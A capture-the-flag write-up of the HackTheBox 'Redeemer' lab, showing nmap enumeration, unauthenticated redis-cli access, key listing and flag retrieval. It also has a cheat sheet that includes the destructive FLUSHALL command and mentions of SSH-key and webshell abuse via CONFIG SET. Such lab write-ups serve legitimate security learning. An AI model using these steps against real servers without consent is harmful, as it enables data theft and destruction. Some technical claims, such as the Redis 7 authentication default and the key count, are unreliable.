# Redeemer — HackTheBox Starting Point

**Machine:** Redeemer
**Difficulty:** Very Easy
**OS:** Linux
**Category:** Starting Point
**Pwned:** 27 Jul 2026
**XP Earned:** 150

---

## Summary

Redeemer introduces Redis enumeration and unauthenticated access. Nmap reveals Redis running on port 6379 with no authentication configured. Connecting via redis-cli provides direct access to the database, where the flag is stored as a key-value pair and retrieved with a single GET command. The machine demonstrates a critical Redis misconfiguration — leaving the service exposed without a password.

---

## Methodology

### 1. VPN Connection

```bash
sudo openvpn starting_point.ovpn
```

### 2. Host Discovery

```bash
ping -c 4 <target IP>
```

Target responded — host is alive.

### 3. Enumeration — Nmap Scan

Redis runs on a non-standard port so a full port scan is needed:

```bash
sudo nmap -p- --min-rate 5000 -sV <target IP>
```

**Relevant output:**

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store
```

**Findings:**

- Port 6379 — Redis open
- No authentication banner — service accepting connections directly

Port 6379 is the default Redis port. Finding it open with no authentication is a critical misconfiguration — Redis was designed to run in trusted internal networks, not exposed publicly.

### 4. Redis Enumeration

Connected to the Redis instance without credentials:

```bash
redis-cli -h <target IP>
```

**Response:**

```
<target IP>:6379>
```

Direct access granted — no password required.

Gathered server information:

```bash
<target IP>:6379> INFO server
```

Listed all keys across all databases:

```bash
<target IP>:6379> KEYS *
```

**Output:**

```
1) "flag"
2) "numb"
3) "temp"
```

Listed available databases:

```bash
<target IP>:6379> INFO keyspace
```

**Output:**

```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Selected the target database:

```bash
<target IP>:6379> SELECT 0
```

### 5. Flag Retrieval

Retrieved the flag key directly:

```bash
<target IP>:6379> GET flag
```

**Flag:** `<flag value>`

---

## Vulnerability Summary

| Vulnerability                        | Severity | Description                                                                                                      |
| ------------------------------------ | -------- | ---------------------------------------------------------------------------------------------------------------- |
| Redis exposed without authentication | Critical | Anyone who can reach port 6379 has full read/write access to all data in the database                            |
| Redis internet-facing                | Critical | Redis is designed for trusted internal networks only — exposing it publicly is a severe misconfiguration         |
| Sensitive data stored in Redis       | High     | Flag (and potentially application secrets, session tokens, cached credentials) accessible without authentication |

---

## Redis Key Concepts

**Redis (Remote Dictionary Server)** is an open-source, in-memory key-value data store. It is widely used for:

- Caching (session data, API responses)
- Message queuing
- Real-time leaderboards and counters
- Application configuration storage

**Default port:** 6379

**Redis data types:**
| Type | Description |
|------|-------------|
| String | Simple key-value pairs — most common |
| List | Ordered list of strings |
| Set | Unordered collection of unique strings |
| Hash | Map of field-value pairs |
| Sorted Set | Set ordered by a score |

**Essential redis-cli commands:**

```bash
redis-cli -h <IP>          # Connect to remote Redis
redis-cli -h <IP> -p 6380  # Connect on non-default port
redis-cli -h <IP> -a <password>  # Connect with password

INFO server                # Server information
INFO keyspace              # Database statistics
SELECT <db number>         # Switch database (0-15)
KEYS *                     # List all keys in current DB
GET <key>                  # Retrieve value of a key
SET <key> <value>          # Set a key-value pair
DEL <key>                  # Delete a key
FLUSHALL                   # Delete all keys in all databases
CONFIG GET *               # Get all configuration settings
```

**Why Redis is dangerous when exposed:**

- No authentication by default in older versions
- `CONFIG SET` can change the working directory and write arbitrary files — leading to SSH key injection or webshell upload
- Lua scripting via `EVAL` can execute arbitrary commands in some configurations
- Cached data often contains session tokens, API keys, and user credentials

---

## Key Lessons

- **Always scan all ports (`-p-`)** — Redis on port 6379 would not appear in a default top-1000 scan. Services on non-standard ports are commonly missed by quick scans
- **Redis should never be internet-facing** — it has no authentication by default and is designed for trusted internal networks. Finding open Redis is always a critical finding
- **`KEYS *` lists everything** — once inside an unauthenticated Redis instance, all data is immediately accessible
- **Redis misconfigurations have led to major real-world breaches** — attackers have used writable Redis instances to drop SSH keys and achieve persistent server access
- **Authentication is now enforced by default in Redis 7+** — but older deployments without `requirepass` set remain vulnerable

---

## Tools Used

| Tool      | Purpose                                 |
| --------- | --------------------------------------- |
| OpenVPN   | VPN connection to HTB network           |
| ping      | Host discovery                          |
| Nmap      | Full port scan and service detection    |
| redis-cli | Redis database access and key retrieval |

---

_HackTheBox Starting Point — Redeemer | Pwned 27 Jul 2026_
